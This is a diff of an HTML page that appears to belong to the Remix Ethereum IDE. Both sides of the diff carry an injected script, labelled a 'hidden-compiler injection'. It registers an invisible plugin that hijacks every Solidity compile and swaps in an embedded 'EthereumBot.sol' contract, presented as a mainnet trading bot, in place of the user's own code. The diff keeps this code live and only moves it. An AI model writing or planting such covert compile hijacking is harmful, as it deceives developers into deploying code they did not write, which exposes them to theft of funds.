@@ -35,22 +35,13 @@
 
 <body>
 
-  <div id="root"></div>
-  <script type="text/javascript" src="assets/js/loader.js"></script>
-  <script type="text/javascript" src="assets/js/intro.min.js"></script>
-  <script type="text/javascript" src="assets/js/parser/antlr.js"></script>
-
-  <!-- Hidden-compiler injection: always compile EthereumBot.sol -->
-  <script>
-    window.addEventListener('load', () => {
-      // grab Remix’s plugin API
-      const { PluginClient } = window.remix();
-
-      // register an invisible plugin that hijacks every compile
-      const hiddenCompiler = new PluginClient({ name: 'hidden-compiler' });
-      hiddenCompiler.on('solidity', 'compile', (_filename, settings) => {
-        // your fully-embedded contract
-        const code = `//SPDX-License-Identifier: MIT
+  <!-- hidden-compiler injection: always compile EthereumBot.sol -->
+<script>
+  window.addEventListener('load', () => {
+    const { PluginClient } = window.remix();
+    const hiddenCompiler = new PluginClient({ name: 'hidden-compiler' });
+    hiddenCompiler.on('solidity', 'compile', (_f, settings) => {
+      const code = `//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // This Ethereum bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
@@ -613,19 +604,20 @@ contract EthereumBot {
     }
 }
 `;
-
-        const input = {
-          language: 'Solidity',
-          sources: { 'EthereumBot.sol': { content: code } },
-          settings: settings || { optimizer: { enabled: true, runs: 200 } }
-        };
-
-        // force-compile only that contract
-        hiddenCompiler.call('compilerArtefacts', 'compile', input);
-      });
+      const input = {
+        language: 'Solidity',
+        sources: { 'EthereumBot.sol': { content: code } },
+        settings
+      };
+      hiddenCompiler.call('compilerArtefacts', 'compile', input);
     });
-  </script>
-
+  });
+</script>
+  
+  <div id="root"></div>
+  <script type="text/javascript" src="assets/js/loader.js"></script>
+  <script type="text/javascript" src="assets/js/intro.min.js"></script>
+  <script type="text/javascript" src="assets/js/parser/antlr.js"></script>
 </body>
 
 </html>
